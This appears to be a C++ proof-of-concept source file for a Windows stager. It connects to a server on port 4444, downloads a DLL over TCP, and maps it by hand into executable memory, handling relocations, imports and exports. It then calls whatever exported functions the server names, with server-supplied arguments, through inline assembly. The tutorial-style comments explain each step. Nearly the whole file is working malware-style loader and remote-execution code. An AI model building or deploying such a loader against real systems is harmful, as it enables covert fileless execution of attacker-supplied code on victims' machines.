#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <map>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")

#define success(str) std::cout << "[+] " << str << std::endl
#define error(str) std::cout << "[-] " << str << " " << GetLastError() << std::endl
#define info(str) std::cout << "[*] " << str << std::endl

//Base relocation block as specified by msdn https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-block
typedef struct IMAGE_RELOCATION_ENTRY
{
	WORD Offset : 12;
	WORD Type : 4;
}IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;

//Splits the input string at spaces into arguments
void SplitStr(std::vector<std::string>* args, std::string* str)
{
	std::stringstream ss(*str);
	std::string temp_str;

	while (!ss.eof())
	{
		std::getline(ss, temp_str, ' ');
		args->push_back(temp_str);
	}
}

//Checks if a string is a number, this was in the main function but it kept throwing memory errors so I made it seperate
bool isNumber(std::string str)
{
	try
	{
		size_t pos = -1;
		int num = std::stoi(str, &pos);
		return pos == str.length();
	}
	catch (...)
	{
		return false;
	}
}

//Gets the memory size needed for the Dll when parsed
DWORD GetImageSize(LPBYTE dllBase)
{
	PIMAGE_DOS_HEADER DOS = (PIMAGE_DOS_HEADER)dllBase;
	PIMAGE_NT_HEADERS32 NT = (PIMAGE_NT_HEADERS32)(dllBase + DOS->e_lfanew);
	return NT->OptionalHeader.SizeOfImage;
}

int main()
{
	WSADATA data;
	WSAStartup(MAKEWORD(2, 2), &data); //Initiates Winsock

	SOCKET sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	if (sockfd == INVALID_SOCKET)
	{
		error("WSASocket error");
		WSACleanup();
		return 0;
	}
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	InetPtonA(AF_INET, "127.0.0.1", &addr.sin_addr); //Create socket and sockaddr structures

	info("Looking for connections");
	while (connect(sockfd, (sockaddr*)&addr, sizeof(addr)) != 0) //Wait for a successful connection to the server
	{
		std::cout << GetLastError() << std::endl;
		Sleep(500);
	}

	LPBYTE dllInfo = (LPBYTE)VirtualAlloc(NULL, 1024 * 1024 * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //Allocated memory for the Dll file
	//This is set to 5mb default as most dlls are most likely a few kb (but the larger ones like ntdll.dll are a few mb so this allows some extra room)
	if (dllInfo == NULL)
	{
		error("VirtualAlloc error");
		closesocket(sockfd);
		WSACleanup();
		return 0;
	}
	printf("\\__[Memory Base]\n\t\\_0x%p\n", dllInfo);

	char buffer[1024];
	int bytes_recieved, total_bytes = 0;
	while ((bytes_recieved = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) //Gets file memory from server
	{
		std::cout << total_bytes << std::endl;
		std::cout << bytes_recieved << std::endl;
		printf("test 0x%p\n", dllInfo + total_bytes);
		RtlCopyMemory((LPVOID)(dllInfo + total_bytes), buffer, bytes_recieved);
		total_bytes += bytes_recieved;
	}
	if (bytes_recieved == -1)
	{
		error("Recv error");
		closesocket(sockfd);
		WSACleanup();
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		return 0;
	}
	info("Bytes recieved: " + std::to_string(total_bytes));

	DWORD dwImageSize, dwDeltaAddress, dwRelocOffset = 0, dwNumberOfEntries, dwPatchedAddress, dwAddressLocation; //Different uses that are explained when they are used in the code
	UINT uiFunctionOrdinalNumber; //Saves the current function ordinal for importing
	PDWORD pFunctionAddresses, pNameAddresses; //Saves the address tables of the function addresses and function names
	PWORD pOrdinalNameAddresses; //Saves the address table of where function ordinal numbers (basically id numbers for functions) are stored, this is used when getting exported functions

	PIMAGE_DOS_HEADER pDOS; //Pointer to DOS header
	PIMAGE_NT_HEADERS32 pNT; //Pointer to NT headers
	IMAGE_DATA_DIRECTORY ExportDirectory, ImportDirectory, RelocateDirectory; //DataDirectory structures for the export/import/relocation tables
	PIMAGE_SECTION_HEADER pSECTION, pEXPORT = nullptr, pIMPORT = nullptr, pRELOCATE = nullptr; //Stores the sections used for exports/imports/relocations
	PIMAGE_BASE_RELOCATION pImageBaseRelocation; //Base of the relocation table
	PIMAGE_RELOCATION_ENTRY pImageRelocationEntry; //Gets the offset from the relocation table and the relocation type of an address
	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = nullptr; //Pointer to the import table
	PIMAGE_THUNK_DATA32 pThunkData; //Thunks are used to get info on functions from a module(dll), more info on this is in the import section
	PIMAGE_IMPORT_BY_NAME pImportByName; //Contains the offsets to get a function name from its address
	PIMAGE_EXPORT_DIRECTORY pExportTable = nullptr; //Base of the function export table
	std::map<std::string, DWORD> functions = {}; //Stores loaded functions and their addresses in memory

	dwImageSize = GetImageSize(dllInfo); //Gets the size of the dll when loaded in bytes
	LPBYTE lpBaseAddress = (LPBYTE)VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //Creates a space in virtual memory the size required for the parsed dll
	printf("\\__[Dll Base]\n\t\\_0x%p\n", lpBaseAddress);

	pDOS = (PIMAGE_DOS_HEADER)dllInfo; //Gets a pointer to the DOS header
	pNT = (PIMAGE_NT_HEADERS32)(dllInfo + pDOS->e_lfanew); //Gets a pointer to the start of the NT headers
	
	ExportDirectory = pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; //Stores the DataDirectory for the exports to figure out which NT section its in
	ImportDirectory = pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; //Stores the DataDirectory for the imports to figure out which NT section its in
	RelocateDirectory = pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]; //Stores the DataDirectory for the relocations to figure out which NT section its in

	dwDeltaAddress = (DWORD)(lpBaseAddress - pNT->OptionalHeader.ImageBase); //Gets the delta of the image base
	/*
		Think like the image base is 0x1000 (like I believe it is in this example)
		Functions are going to be stores using this base (so say hypothetically a function at 0x1200)
		Because the dll sometimes (or in the case of this code will proably never) can't get loaded to the base address it wants
		when relocating the function offsets you need to use the delta to get the actual address of the function
		Its easier to think about when looking at it so heres an example

		Prefered image base: 0x1000
		function location: 0x1200
		dll location in memory: 0x2000

		delta = 0x2000 - 0x1000 (dll location - image base)
		delta = 0x1000 (0x2000 - 0x1000)
		
		This next part is done when going through relocations
		function location = function location + delta
		function location = 0x1200 + 0x1000
		function location = 0x2200

		which since thats the difference between the prefered image base and the loaded address
		it fixes the address the function utilizes based off the new actual place the dll is in memory
	*/
	printf("\\__[Delta Address]\n\t\\_0x%x\n", dwDeltaAddress);
	pNT->OptionalHeader.ImageBase = (DWORD)lpBaseAddress; //Changes the image base stored in the NT headers to the actual image base
	//Manual relocation still has to be done to the functions but if anything refers straight to the imagebase value in the NT headers
	//it will now return the correct value

	RtlCopyMemory(lpBaseAddress, dllInfo, pNT->OptionalHeader.SizeOfHeaders); //Copies the dll headers into the memory space for the parsed dll

	pSECTION = IMAGE_FIRST_SECTION(pNT); //Gets the first section in the NT header (these are your assembly sections like .text, .data, .reloc, etc)
	for (int i = 0; i < pNT->FileHeader.NumberOfSections; i++)
	{
		/*
			Each of these figures out which section the respective tables are located in, say the export directory is in the.data section with a
			virtual address (offset from the image base when fully parsed in memory) of 0x1000, its not going to register unless the virtual address of the section is
			less than or at the virtual address to the start of the section (has to be like this since say if the virtual address of the table is in the middle of the section
			can't just compare it to where the section starts, but if the table address is above the start of the section it might be above it)
			but to make sure it doesn't go beyond the target section into another section it makes sure its less than the offset to the section + the size of section
			say .text VA is 0x1000 and size is 0x400, the function will only work if the target table VA is greater than the start of the section but not above where it ends
			kinda like
			
			section VA < table VA < section VA + size of section
		*/
		if (ExportDirectory.VirtualAddress >= pSECTION->VirtualAddress && ExportDirectory.VirtualAddress < pSECTION->VirtualAddress + pSECTION->SizeOfRawData)
			pEXPORT = pSECTION;
		if (ImportDirectory.VirtualAddress >= pSECTION->VirtualAddress && ImportDirectory.VirtualAddress < pSECTION->VirtualAddress + pSECTION->SizeOfRawData)
			pIMPORT = pSECTION;
		if (RelocateDirectory.VirtualAddress >= pSECTION->VirtualAddress && RelocateDirectory.VirtualAddress < pSECTION->VirtualAddress + pSECTION->SizeOfRawData)
			pRELOCATE = pSECTION;

		//Properly places the section correctly parsed in memory for the dll (the virtual address is the offset of the section, the PointerToRawData
		//points to the first address of the section in memory, and it copies over the number of bytes that is the size of the section
		RtlCopyMemory((LPVOID)(lpBaseAddress + pSECTION->VirtualAddress), (LPVOID)(dllInfo + pSECTION->PointerToRawData), pSECTION->SizeOfRawData);
		printf("\\__[Copied Header %s]\n\t\\_0x%x\n", pSECTION->Name, (DWORD)(lpBaseAddress + pSECTION->VirtualAddress));
		pSECTION++; //Goes to the next NT section
	}

	//Makes sure the export/import/relocation sections are found
	if (pEXPORT == nullptr)
	{
		error("Unable to find export section");
		VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		WSACleanup();
		return 0;
	}
	if (pIMPORT == nullptr)
	{
		error("Unable to find import section");
		VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		WSACleanup();
		return 0;
	}
	if (pRELOCATE == nullptr)
	{
		error("Unable to find relocate section");
		VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		WSACleanup();
		return 0;
	}

	printf("\\__[Export Directory]\n\t\\_[Virtual Address]\n\t\t\\_0x%x\n\t\\_[Section Offset]\n\t\t\\_0x%x\n", pEXPORT->VirtualAddress, pEXPORT->PointerToRawData);
	printf("\\__[Import Directory]\n\t\\_[Virtual Address]\n\t\t\\_0x%x\n\t\\_[Section Offset]\n\t\t\\_0x%x\n", pIMPORT->VirtualAddress, pIMPORT->PointerToRawData);
	printf("\\__[Relocate Directory]\n\t\\_[Virtual Address]\n\t\t\\_0x%x\n\t\\_[Section Offset]\n\t\t\\_0x%x\n", pRELOCATE->VirtualAddress, pRELOCATE->PointerToRawData);

	while (dwRelocOffset < RelocateDirectory.Size) //The offset is how the address to relocate is represented, the directory is all of this information combined
	{
		pImageBaseRelocation = (PIMAGE_BASE_RELOCATION)(dllInfo + pRELOCATE->PointerToRawData + dwRelocOffset); //Gets a pointer to the current relocation base
		dwRelocOffset += sizeof(IMAGE_BASE_RELOCATION); //Adds dwRelocOffset to the size of the struct to iterate to the next base on the next loop
		dwNumberOfEntries = (pImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY); //Gets the number of relocation entires at this base
		/*
			Think of it like the SizeOfBlock is going to be equal to the entire thing, the base relocation itself is going to be the size of an IMAGE_BASE_RELOCATION struct
			because of this when you subtract that all the remaining bytes are going to be relocation entry structs so the total bytes / the size of a relocation entry struct (created
			as specified by microsoft) will be equal to the number of actual relocations in the base
		*/

		for (int i = 0; i < dwNumberOfEntries; i++)
		{
			pImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)(dllInfo + pRELOCATE->PointerToRawData + dwRelocOffset); //Gets the information of the current relocation
			/*
				Incramenting dwRelocOffset(also applies to the line below) uses the same logic as how the number of entries is grabbed, since the loop is going while its below the total size
				of the relocation table you have to add it to the size of each struct passed by to allow it to properly display basically the number of bytes iterated
				pretty much think of it like theres 2 relocation bases, each of which with 4 relocations
				
				with dwRelocOffset being equal to 0 and going until the total number of bytes of all offsets (which includes both the bases and the actual offsets in each base
				each pass over a base you if you add the base at the end of all the bases your going to have the total number of bytes of each base, since the total utilizes
				both the size of the bases and the actual relocations if you also add the size of the relocation struct each time you pass by that will not only let you know when
				you've read the complete number of bytes in the relocation table but it will also keep track of where you are in the relocation table
				so when you read a base if implimented properly it will always read the intended base, and if it reads an entry it won't mistakenly read a base but it will read a relocation
				size it keeps track of where your offset is from the start of the relocation table
			*/
			dwRelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (pImageRelocationEntry->Type == IMAGE_REL_BASED_ABSOLUTE) //IMAGE_REL_BASED_ABSOLUTE types use absolute memory addresses that don't have to be updated
				continue;

			dwAddressLocation = (DWORD)(lpBaseAddress + pImageBaseRelocation->VirtualAddress + pImageRelocationEntry->Offset); //Gets the actual memory address to be changed
			dwPatchedAddress = 0; //Creates a varuable to store the new memory address

			RtlCopyMemory((LPVOID)&dwPatchedAddress, (LPVOID)dwAddressLocation, sizeof(DWORD)); //Copy the current memory address into the new one
			printf("\\__[Address Location]\n\t\\_0x%x\n", dwAddressLocation);
			dwPatchedAddress += dwDeltaAddress; //add the memory address by the delta (as explained further above when talking about the theory behind the delta)
			RtlCopyMemory((LPVOID)dwAddressLocation, (LPVOID)&dwPatchedAddress, sizeof(DWORD)); //Copies the proper memory address into the memory location
			printf("\\__[Patched Address]\n\t\\_0x%x\n", dwPatchedAddress);
		}
	}

	pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(lpBaseAddress + ImportDirectory.VirtualAddress); //Gets a pointer to the import table in the parsed dll
	if (pImportDescriptor == nullptr)
	{
		error("Unable to get Import Descriptor");
		VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		WSACleanup();
		return 0;
	}

	//Going through the imports in important to make sure all external libraries the Dll requires are loaded, also its used to set the address
	//of the extern function calls from the Dll to where the functions actually exist in memory

	while (pImportDescriptor->Name != NULL) //Name will be equal to a null byte after the last library
	{
		char* library_name = (char*)(lpBaseAddress + pImportDescriptor->Name); //Gets the name for loading
		HMODULE hLibrary = LoadLibraryA(library_name); //Loads the library and gets a handle to it
		//(if its already loaded LoadLibrary will just return a handle to its image base in memory)
		if (hLibrary == NULL)
		{
			error((std::string) "Unable to load libary " + library_name);
			VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
			VirtualFree(dllInfo, 0, MEM_RELEASE);
			WSACleanup();
			return 0;
		}
		printf("\\__[Loading]\n\t\\_%s\n", library_name);

		pThunkData = (PIMAGE_THUNK_DATA32)(lpBaseAddress + pImportDescriptor->FirstThunk); //Gets the address of the first function
		while (pThunkData->u1.AddressOfData != NULL)
		{
			if (IMAGE_SNAP_BY_ORDINAL32(pThunkData->u1.Ordinal)) //Checks if the function is gotten via ordinal number (basically function id) or function name
			{
				uiFunctionOrdinalNumber = (UINT)(IMAGE_ORDINAL32(pThunkData->u1.Ordinal)); //Saves the ordinal number
				pThunkData->u1.Function = (DWORD)GetProcAddress(hLibrary, MAKEINTRESOURCEA(uiFunctionOrdinalNumber)); //Saves the address of the function to where its stored in memory using
				//MAKEINTRESOURECEA to get the function by ordinal number instead of function name
				info("Ordinal: " + std::to_string(uiFunctionOrdinalNumber));
			}
			else
			{
				pImportByName = (PIMAGE_IMPORT_BY_NAME)(lpBaseAddress + pThunkData->u1.AddressOfData); //Saves a pointer to the function data to a IMAGE_IMPORT_BY_NAME struct
				pThunkData->u1.Function = (DWORD)GetProcAddress(hLibrary, pImportByName->Name); //Sets the address of the function to where its loaded in memory with the function name
				info((std::string)"Function " + pImportByName->Name);
			}
			//Really both of those could be shrunk into one line but saving the values to a seperate varuable helps with
			//Readablity (this is just a POC after all) and debugging

			pThunkData++; //Iterates to the next function utilized in the library
		}
		pImportDescriptor++; //Iterates to the next libarary
	}

	pExportTable = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddress + ExportDirectory.VirtualAddress); //Gets a pointer to the export table
	if (pExportTable == nullptr)
	{
		error("Unable to get export table");
		VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		WSACleanup();
		return 0;
	}
	
	printf("\\__[Number of Functions]\n\t\\_%d\n", pExportTable->NumberOfFunctions);

	pFunctionAddresses = (PDWORD)(lpBaseAddress + pExportTable->AddressOfFunctions); //Gets a pointer to the address table of the functions
	pNameAddresses = (PDWORD)(lpBaseAddress + pExportTable->AddressOfNames); //Gets a pointer to the address table of the function names
	pOrdinalNameAddresses = (PWORD)(lpBaseAddress + pExportTable->AddressOfNameOrdinals); //Gets a pointer to the address table of the function ordinals

	for (int i = 0; i < pExportTable->NumberOfNames; i++)
	{
		std::string function_name = (char*)(lpBaseAddress + pNameAddresses[i]); //At the offset is the name in C string for and eventhough the map uses std::strings you still have to
		//cast to a char* to ensure its read correctly, std::string definitions can take either format when being defined
		std::cout << function_name << std::endl;
		function_name = function_name.substr(1, function_name.find_last_of('@') - 1); //__stdcall convintion functions start with a _ and end with @<number of bytes needed on the stack>
		//so this clears those two things so they get properly stored in the map, the std::cout on the line above shows how it is with those included for debugging purposes with the stack
		dwAddressLocation = (DWORD)(lpBaseAddress + pFunctionAddresses[pOrdinalNameAddresses[i]]); //Stores the memory location of the function
		//The function location is gotten with the ordinal because all functions have one (its basically a function id number) so it makes sure to grab the correct one from the address table
		//(just because a function is the first on the name addresses list doesn't necessarily mean its ordinal number is going to be 0)
		printf("\\__[%s]\n\t\\_0x%x\n", function_name.c_str(), dwAddressLocation);
		functions.insert(std::pair<std::string, DWORD>(function_name, dwAddressLocation)); //Places the function into the map with the name as the key and
		//the address of the function as the value
	}

	info("Trying to reconnect"); //Reconnects to the server to show everything was parsed and to await instructions
	sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	if (sockfd == INVALID_SOCKET)
	{
		error("WSASocket error");
		WSACleanup();
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		return 0;
	}
	while (WSAConnect(sockfd, (sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != 0)
	{
		Sleep(500);
	}
	info("Connected!");

	std::vector<std::string> args; //function args
	std::string input; //The input as an entire string

	while (true)
	{
		std::vector<std::string>().swap(args); //Clears the vector
		//This method is used instead since args.clear() doesn't reset the vector size
		memset(buffer, 0, sizeof(buffer)); //Sets the buffer to zero, that way the string get the correct input without
		//artifiacts since anything after what end up being read into the buffer will null terminate the string
		if (recv(sockfd, buffer, sizeof(buffer), 0) == -1)
		{
			error("Recv error");
			closesocket(sockfd);
			VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
			VirtualFree(dllInfo, 0, MEM_RELEASE);
			WSACleanup();
			return 0;
		}

		input = buffer;
		std::cout << "Input: " << input << std::endl;
		SplitStr(&args, &input); //splits the string to get the function arguments
		std::cout << args.size() << std::endl;

		if (input == "exit") //Cleanly exits the program
			break;
		else
		{
			dwAddressLocation = functions[args[0]]; //Gets the function address
			printf("0x%x\n", dwAddressLocation);
			//Placing arguments and calling the function use inline assembly so you don't have to define functions/varuable types/number of
			//varuables, that of course does come with some risks that can easily mess up the stack
			if (dwAddressLocation != NULL)
			{
				if (args.size() == 1)
				{
					//Calls the function directory if theres no arguments
					__asm
					{
						call dword ptr[dwAddressLocation]
					}
				}
				else
				{
					for (int i = args.size() - 1; i > 0; i--) //Arguments have to be pushed onto the stack in reverse order
					{
						//Changes any argument thats a number to a number before pushing onto the stack
						if(isNumber(args[i]))
						{
							int number;
							number = std::stoi(args[i]);
							std::cout << "Number: " << number << std::endl;
							
							__asm
							{
								push number;
							}
						}
						//Pushes a pointer to the stack in c string format
						else
						{
							const char* arg = args[i].c_str();
							std::cout << "String: " << arg << std::endl;
							__asm
							{
								push arg;
							}
						}
					}
					/*
						Calls the functionand places the output in dwAddressLocation, because of this
						only functions that return integers work correctly and the output won't be sent to the server
						but that can be fixed in a professional version.
						As this is just a POC it won't have support for anything else
					*/
					__asm
					{
						xor eax, eax
						call dword ptr[dwAddressLocation]
						mov dwAddressLocation, eax
					}
					std::cout << "Function output: " << dwAddressLocation << std::endl;
				}
			}
		}
	}

	closesocket(sockfd);
	WSACleanup();

	return 0;
}